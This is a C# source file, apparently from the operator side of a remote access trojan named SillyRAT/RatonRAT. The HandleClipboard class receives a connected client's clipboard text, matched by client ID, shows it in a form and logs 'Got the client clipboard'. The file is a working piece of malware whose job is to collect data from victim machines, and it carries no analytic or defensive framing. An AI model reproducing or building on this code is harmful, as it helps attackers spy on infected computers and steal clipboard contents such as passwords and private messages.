using System;
using System.Drawing;
using System.Windows.Forms;
using SillyRAT;
using Server.Connection;
using RatonRAT.ClientForms;
using Stuff;

namespace Server.Handlers
{
    internal class HandleClipboard
    {
        public HandleClipboard(SillyClient SillyClient, Unpack msgUnpack)
        {
            string formName = "Clipboard | Client ID: ";
            FormClipboard clipboard = (FormClipboard)Application.OpenForms[formName + msgUnpack.GetAsString("UID")];

            if (clipboard != null)
            {
                if (clipboard.SillyClient == null)
                {
                    clipboard.SillyClient = SillyClient;
                }

                clipboard.Invoke(new Action(() =>
                {
                    string text = msgUnpack.GetAsString("Text");
                    clipboard.textBox2.Text = text;
                    clipboard.textBox2.ForeColor = Color.White;
                    Program.form2.Invoke(new Action(() =>
                    {
                        Program.form2.AddLog("Got the client clipboard", Color.White);
                    }));
                }));
            }
        }
    }
}
